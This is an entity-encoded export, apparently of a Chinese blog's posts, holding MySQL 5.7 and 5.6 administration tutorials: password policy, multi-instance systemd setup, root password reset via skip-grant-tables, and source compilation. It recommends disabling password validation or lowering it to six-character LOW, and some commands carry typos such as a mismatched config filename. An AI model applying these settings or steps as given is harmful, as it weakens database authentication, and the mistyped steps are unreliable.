5.7&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;&#x662F;MEDIUM&#xFF0C;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#xFF0C;&#x4E0D;&#x7136;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x90FD;&#x4E0D;&#x80FD;&#x7528;&#xFF0C;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x540E;&#x624D;&#x80FD;&#x6B63;&#x5E38;&#x64CD;&#x4F5C;&#x3002;&#x65B9;&#x6CD5;&#x4E00;&#xFF1A;&#x5173;&#x95ED;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;&#x63D2;&#x4EF6;&#x4FEE;&#x6539;MySQL&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6DFB;&#x52A0;&#x5982;&#x4E0B;&#x53C2;&#x6570; validate_password=off &#x65B9;&#x6CD5;&#x4E8C;&#xFF1A;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x5F3A;&#x5EA6;&#x7B56;&#x7565;&#xFF08;&#x63A8;&#x8350;&#xFF09;12345678-- &#x67E5;&#x770B;&#x5BC6;&#x7801;&#x7B56;&#x7565;SHOW VARIABLES like &quot;%password%&quot;;SET global validate_password_length=6;SET global validate_password_policy=0;# 0 &#x6216; LOW# 1 &#x6216; MEDIUM# 2 &#x6216; STRONGFLUSH PRIVILEGES; MySQL 5.7&#x591A;&#x5B9E;&#x4F8B;&#x914D;&#x7F6E;&#x5B89;&#x88C5;MySQL 5.7 rpm&#x5305; rpm -e --nodeps mariadb-libs rpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpm rpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5B58;&#x653E;&#x76EE;&#x5F55; mkdir -p /data/mysql/{3306, 3307} mkdir -p /data/mysql/3306/{data, binlog, logs} mkdir -p /data/mysql/3307/{data, binlog, logs} &#x521B;&#x5EFA;&#x7528;&#x6237;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4; chown -Rf mysql:mysql /data/mysql mv /etc/my.cnf /etc/my.cnf.bak &#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3306.cnf1234567891011cat&gt;&gt;/etc/my3306.cnf&lt;&lt;EOF[mysqld]user = mysqlport = 3306server_id = 3306datadir = /data/mysql/3306/datasocket = /data/mysql/3306/mysql3306.socksymbolic-links = 0log-error = /data/mysql/3306/logs/mysqld3306.logpid-file = /data/mysql/3306/mysqld3306.pidEOF &#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3307.cnf1234567891011121314cp /etc/my3306.cnf /etc/my3307.cnfsed -i &apos;s/3306/3307/g&apos; /etc/my3307.cnf[root@jaking mysql5.7]# cat /etc/my3307.cnf[mysqld]user = mysqlport = 3307server_id = 3307datadir = /data/mysql/3307/datasocket = /data/mysql/3307/mysql3307.socksymbolic-links = 0log-error = /data/mysql/3307/logs/mysqld3307.logpid-file = /data/mysql/3307/mysqld3307.pid &#x5907;&#x4EFD;mysql&#x542F;&#x52A8;&#x670D;&#x52A1;&#x6587;&#x4EF6; mv /usr/lib/systemd/system/mysqld.service /usr/lib/systemd/system/mysqld.service.bak &#x65B0;&#x589E;mysqld3306.service&#x542F;&#x52A8;&#x6587;&#x4EF6;1234567891011121314151617181920212223242526cat&gt;&gt;/usr/lib/systemd/system/mysqld3306.service&lt;&lt;EOF[Unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3306/mysqld3306.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3306.cnf --daemonize --pid-file=/data/mysql/3306/mysqld3306.pid $MYSQLD_OPTSEnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=falseEOF &#x65B0;&#x589E;mysqld3307.service&#x542F;&#x52A8;&#x6587;&#x4EF6;123456789101112131415161718192021222324252627cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3307.servicesed -i &apos;s/3306/3307/g&apos; /usr/lib/systemd/system/mysqld3307.service[root@jaking mysql5.7]# cat /usr/lib/systemd/system/mysqld3307.service[Unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3307/mysqld3307.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3307.cnf --daemonize --pid-file=/data/mysql/3307/mysqld3307.pid EnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=false &#x521D;&#x59CB;&#x5316;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307 mysqld --defaults-file=/etc/my3306.cnf --initialize --user=mysql --datadir=/data/mysql/3306/data mysqld --defaults-file=/etc/mysql3307.cnf --initialize --user=mysql --datadir=/data/mysql/3307/data &#x542F;&#x52A8;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307 systemctl daemon-reload systemctl start mysqld3306 systemctl start mysqld3307 netstat -pantul | grep mysql ps aux | grep mysql &#x67E5;&#x770B;MySQL root&#x521D;&#x59CB;&#x5BC6;&#x7801; cat /data/mysql/3306/logs/mysqld3306.log | grep root cat /data/mysql/3307/logs/mysqld3307.log | grep root &#x767B;&#x5F55;&#x591A;&#x5B9E;&#x4F8B;&#x5E76;&#x4FEE;&#x6539;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801; # mysql3306&#x5B9E;&#x4F8B; mysql -S /data/mysql/3306/mysql3306.sock -uroot -p 123# &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;newPassword&apos;;FLUSH PRIVILEGES; # mysql3307&#x5B9E;&#x4F8B; mysql -S /data/mysql/3307/mysql3307.sock -uroot -p 123# &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;New_password&apos;;FLUSH PRIVILEGES; &#x589E;&#x52A0;&#x5B9E;&#x4F8B;&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4; mkdir -p /data/mysql/3308/{data, binlog, logs} chown -Rf mysql:mysql /data/mysql/3308 &#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3308.cnf cp /etc/my3306.cnf /etc/my3308.cnf sed -i &apos;s/3306/3308/g&apos; /etc/my3308.cnf 12345678910cat /etc/my3308.cnf[mysqld]user = mysqlport = 3308server_id = 3308datadir = /data/mysql/3308/datasocket = /data/mysql/3308/mysql3308.socksymbolic-links = 0log-error = /data/mysql/3308/logs/mysqld3308.logpid-file = /data/mysql/3308/mysqld3308.pid &#x6DFB;&#x52A0;mysqld3308.service&#x542F;&#x52A8;&#x6587;&#x4EF6; cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3308.service sed -i &apos;s/3306/3308/g&apos; /usr/lib/systemd/system/mysqld3308.service 123456789101112131415161718192021222324cat /usr/lib/systemd/system/mysqld3308.service[Unit]Description=MySQL ServerDocumentation=man:mysqld(8)Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.htmlAfter=network.targetAfter=syslog.target[Install]WantedBy=multi-user.target[Service]User=mysqlGroup=mysqlType=forkingPIDFile=/data/mysql/3308/mysqld3308.pidTimeoutSec=0PermissionsStartOnly=trueExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3308.cnf --daemonize --pid-file=/data/mysql/3308/mysqld3308.pid EnvironmentFile=-/etc/sysconfig/mysqlLimitNOFILE = 5000Restart=on-failureRestartPreventExitStatus=1PrivateTmp=false &#x521D;&#x59CB;&#x5316;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308 mysqld --defaults-file=/etc/my3308.cnf --initialize --user=mysql --datadir=/data/mysql/3308/data &#x542F;&#x52A8;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308 systemctl start mysqld3308 netstat -nutpl | grep mysql &#x83B7;&#x53D6;mysql3308 root&#x521D;&#x59CB;&#x5316;&#x5BC6;&#x7801; cat /data/mysql/3308/logs/mysqld3308.log | grep root &#x767B;&#x5F55;mysql3308&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801; mysql -S /data/mysql/3308/mysql3308.sock -uroot -p 12ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &quot;NewPassword&quot;;FLUSH PRIVILEGES; &#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;vim /etc/my.cnf [mysqld] datadir=/var/lib/mysql socket=/var/lib/mysql/mysql.sock symbolic-links=0 port=3307 log-error=/var/log/mysqld.log pid-file=/var/run/mysqld/mysqld.pid netstat -pantul | grep 3307 MySQL 5.7 &#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7ED5;&#x8FC7;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1; echo skip-grant-tables &gt;&gt; /etc/my.cnf /etc/init.d/mysqld restart &#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;root&#x5BC6;&#x7801; mysql 12ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;new_Password&apos;;FLUSH PRIVILEGES; &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5220;&#x9664;skil-grant-tables&#xFF0C;&#x6062;&#x590D;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1; &#x91CD;&#x542F;MySQL document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL5.6","date":"2022-06-07T04:43:37.000Z","path":"/posts/16fc5dc4/","text":"&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.61. &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;12[root@localhost&#xA0;~]# cd /usr/local/src[root@localhost&#xA0;src]#&#xA0;yum&#xA0;install&#xA0;&#x2010;y&#xA0;&#xA0;gcc*&#xA0;&#xA0;make&#xA0;&#xA0;ncurses* perl* 2. &#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;12345[root@localhost&#xA0;src]#&#xA0;tar&#xA0;xvf&#xA0;cmake&#x2010;2.8.11.2.tar.gz[root@localhost&#xA0;src]#&#xA0;cd&#xA0;cmake&#x2010;2.8.11.2[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;./configure[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;make[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;make&#xA0;install 3. &#x914D;&#x7F6E;MySQL &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;12[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;cd&#xA0;..[root@localhost&#xA0;src]#&#xA0;useradd&#xA0;mysql&#xA0;&#x2010;s&#xA0;/sbin/nologin &#x521B;&#x5EFA;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql &#x5176;&#x4E2D;&#xFF0C;/usr/local/mysql &#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x76EE;&#x5F55;&#xFF0C;/usr/local/mysql/var &#x5219;&#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;12[root@localhost&#xA0;src]#&#xA0;mkdir&#xA0;&#x2010;p&#xA0;/usr/local/mysql/var[root@localhost&#xA0;src]#&#xA0;chown&#xA0;&#x2010;Rf&#xA0;mysql:mysql&#xA0;/usr/local/mysql &#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5; MySQL &#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F; cmake &#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR &#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL &#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;1234[root@localhost&#xA0;src]#&#xA0;tar&#xA0;xvf&#xA0;mysql&#x2010;5.6.19.tar.gz[root@localhost&#xA0;src]#&#xA0;cd&#xA0;mysql&#x2010;5.6.19[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;cmake&#xA0;.&#xA0;&#x2010;DCMAKE_INSTALL_PREFIX=/usr/local/mysql&#xA0;&#x2010;DMYSQL_DATADIR=/usr/local/mysql/var&#xA0;&#x2010;DSYSCONFDIR=/etc[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;make&#xA0;&amp;&amp;&#xA0;make&#xA0;install &#x4E3A;&#x4E86;&#x8BA9; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664; /etc &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55; scripts &#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; mysql_install_db &#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528; &#x2013;user &#x53C2;&#x6570;&#x6307;&#x5B9A; MySQL &#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528; &#x2013;basedir &#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL &#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528; &#x2013;datadir &#x53C2;&#x6570;&#x6307;&#x5B9A; MySQL &#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x65B0;&#x7684;MySQL &#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;123[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;rm&#xA0;&#x2010;rf&#xA0;/etc/my.cnf[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;cd&#xA0;/usr/local/mysql[root@localhost&#xA0;mysql]#&#xA0;./scripts/mysql_install_db&#xA0;&#x2010;&#x2010;user=mysql&#xA0;&#x2010;&#x2010;basedir=/usr/local/mysql&#xA0;&#x2010;&#x2010;datadir=/usr/local/mysql/var &#x628A;Linux&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x8BB0;&#x5F97;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;123456[root@localhost&#xA0;mysql]#&#xA0;lsbin&#xA0;data&#xA0;include&#xA0;lib&#xA0;my.cnf&#xA0;README&#xA0;share&#xA0;support&#x2010;filesCOPYING&#xA0;docs&#xA0;INSTALL&#x2010;BINARY&#xA0;man&#xA0;mysql&#x2010;test&#xA0;scripts&#xA0;sql&#x2010;bench&#xA0;var[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;my.cnf&#xA0;/etc/my.cnf[root@localhost&#xA0;mysql]#&#xA0;cp&#xA0;./support&#x2010;files/mysql.server&#xA0;/etc/rc.d/init.d/mysqld[root@localhost&#xA0;mysql]#&#xA0;chmod&#xA0;755&#xA0;/etc/rc.d/init.d/mysqld &#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;123[root@localhost&#xA0;mysql]#&#xA0;vim&#xA0;/etc/rc.d/init.d/mysqld&#xA0;46&#xA0;basedir=/usr/local/mysql&#xA0;47&#xA0;datadir=/usr/local/mysql/var &#x914D;&#x7F6E;&#x597D;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x540E;&#x4FBF;&#x53EF;&#x4EE5;&#x7528;service&#x547D;&#x4EE4;&#x542F;&#x52A8;mysqld&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x4E86;&#x3002;mysqld&#x662F;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x670D;&#x52A1;&#x540D;&#x79F0;&#xFF0C;&#x6CE8;&#x610F;&#x4E0D;&#x8981;&#x5199;&#x9519;&#x3002;&#x518D;&#x4F7F;&#x7528;chkconfig&#x547D;&#x4EE4;&#x628A;mysqld&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;1234[root@localhost&#xA0;mysql]#&#xA0;service&#xA0;mysqld&#xA0;startUnit&#xA0;mysqld.service&#xA0;could&#xA0;not&#xA0;be&#xA0;found.Starting&#xA0;MySQL.&#xA0;SUCCESS![root@localhost&#xA0;mysql]#&#xA0;chkconfig&#xA0;mysqld&#xA0;on &#x5728;/etc/profile&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x6700;&#x540E;&#x52A0;&#x5165;export PATH=$PATH:/usr/local/mysql/bin12[root@localhost&#xA0;mysql]#&#xA0;vim&#xA0;/etc/profile&#xA0;export&#xA0;PATH=$PATH:/usr/local/mysql/bin MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x8FD8;&#x4F1A;&#x8C03;&#x7528;&#x5230;&#x4E00;&#x4E9B;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x548C;&#x51FD;&#x6570;&#x5E93;&#x6587;&#x4EF6;&#x3002;&#x7531;&#x4E8E;&#x5F53;&#x524D;&#x662F;&#x901A;&#x8FC7;&#x6E90;&#x7801;&#x5305;&#x65B9;&#x5F0F;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x56E0;&#x6B64;&#x73B0;&#x5728;&#x4E5F;&#x5FC5;&#x987B;&#x4EE5;&#x624B;&#x52A8;&#x65B9;&#x5F0F;&#x628A;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x8FC7;&#x6765;1234[root@localhost&#xA0;mysql]#&#xA0;mkdir&#xA0; /var/lib/mysql[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;/usr/local/mysql/lib/mysql&#xA0; /usr/lib/mysql[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s /var/lib/mysql/mysql.sock&#xA0; /tmp/mysql.sock&#xA0;[root@localhost&#xA0;mysql]#&#xA0;ln&#xA0;&#x2010;s&#xA0;/usr/local/mysql/include/mysql&#xA0; /usr/include/mysql &#x73B0;&#x5728;&#xFF0C;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x5DF2;&#x7ECF;&#x542F;&#x52A8;&#xFF0C;&#x8C03;&#x7528;&#x7684;&#x5404;&#x4E2A;&#x51FD;&#x6570;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x5C31;&#x4F4D;&#xFF0C;PATH&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#x4E5F;&#x52A0;&#x5165;&#x4E86;MySQL&#x6570;&#x636E;&#x5E93;&#x547D;&#x4EE4;&#x7684;&#x6240;&#x5728;&#x76EE;&#x5F55;&#x3002;&#x63A5;&#x4E0B;&#x6765;&#x51C6;&#x5907;&#x5BF9;MySQL&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x8FD9;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x7684;&#x914D;&#x7F6E;&#x8FC7;&#x7A0B;&#x4E0E;MariaDB&#x6570;&#x636E;&#x5E93;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x6700;&#x540E;&#x53D8;&#x6210;&#x4E86;Thanks for using MySQL! &#x6CE8;&#x610F;&#xFF1A;&#x5982;&#x679C; mysql_secure_installation &#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6216;&#x8005;&#x91CD;&#x65B0;&#x8FDE;&#x63A5; Linux &#x7CFB;&#x7EDF;&#x540E;&#x518D;&#x4F7F;&#x7528; mysql_secure_installation &#x6765;&#x521D;&#x59CB;&#x5316;MySQL&#x6570;&#x636E;&#x5E93;&#x3002; 1234567891011121314151617181920212223242526272829303132333435363738394041424344[root@localhost&#xA0;~]#&#xA0;mysql_secure_installationNOTE:&#xA0;RUNNING&#xA0;ALL&#xA0;PARTS&#xA0;OF&#xA0;THIS&#xA0;SCRIPT&#xA0;IS&#xA0;RECOMMENDED&#xA0;FOR&#xA0;ALL&#xA0;MySQLSERVERS&#xA0;IN&#xA0;PRODUCTION&#xA0;USE!&#xA0;PLEASE&#xA0;READ&#xA0;EACH&#xA0;STEP&#xA0;CAREFULLY!In&#xA0;order&#xA0;to&#xA0;log&#xA0;into&#xA0;MySQL&#xA0;to&#xA0;secure&#xA0;it,&#xA0;we&apos;ll&#xA0;need&#xA0;the&#xA0;currentpassword&#xA0;for&#xA0;the&#xA0;root&#xA0;user.&#xA0;If&#xA0;you&apos;ve&#xA0;just&#xA0;installed&#xA0;MySQL,&#xA0;andyou&#xA0;haven&apos;t&#xA0;set&#xA0;the&#xA0;root&#xA0;password&#xA0;yet,&#xA0;the&#xA0;password&#xA0;will&#xA0;be&#xA0;blank,so&#xA0;you&#xA0;should&#xA0;just&#xA0;press&#xA0;enter&#xA0;here.Enter&#xA0;current&#xA0;password&#xA0;for&#xA0;root&#xA0;(enter&#xA0;for&#xA0;none):&#xA0;&#x6B64;&#x5904;&#x53EA;&#x9700;&#x6309;&#x4E0B;&#x56DE;&#x8F66;&#x952E;OK,&#xA0;successfully&#xA0;used&#xA0;password,&#xA0;moving&#xA0;on...Setting&#xA0;the&#xA0;root&#xA0;password&#xA0;ensures&#xA0;that&#xA0;nobody&#xA0;can&#xA0;log&#xA0;into&#xA0;the&#xA0;MySQLroot&#xA0;user&#xA0;without&#xA0;the&#xA0;proper&#xA0;authorisation.Set&#xA0;root&#xA0;password?&#xA0;[Y/n]&#xA0;y&#xA0;&#xFF08;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5BC6;&#x7801;&#xFF09;New&#xA0;password:&#xA0;&#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;Re&#x2010;enter&#xA0;new&#xA0;password:&#xA0;&#x518D;&#x8F93;&#x5165;&#x4E00;&#x6B21;&#x5BC6;&#x7801;Password&#xA0;updated&#xA0;successfully!Reloading&#xA0;privilege&#xA0;tables.....&#xA0;Success!By&#xA0;default,&#xA0;a&#xA0;MySQL&#xA0;installation&#xA0;has&#xA0;an&#xA0;anonymous&#xA0;user,&#xA0;allowing&#xA0;anyoneto&#xA0;log&#xA0;into&#xA0;MySQL&#xA0;without&#xA0;having&#xA0;to&#xA0;have&#xA0;a&#xA0;user&#xA0;account&#xA0;created&#xA0;forthem.&#xA0;This&#xA0;is&#xA0;intended&#xA0;only&#xA0;for&#xA0;testing,&#xA0;and&#xA0;to&#xA0;make&#xA0;the&#xA0;installationgo&#xA0;a&#xA0;bit&#xA0;smoother.&#xA0;You&#xA0;should&#xA0;remove&#xA0;them&#xA0;before&#xA0;moving&#xA0;into&#xA0;aproduction&#xA0;environment.Remove&#xA0;anonymous&#xA0;users?&#xA0;[Y/n]&#xA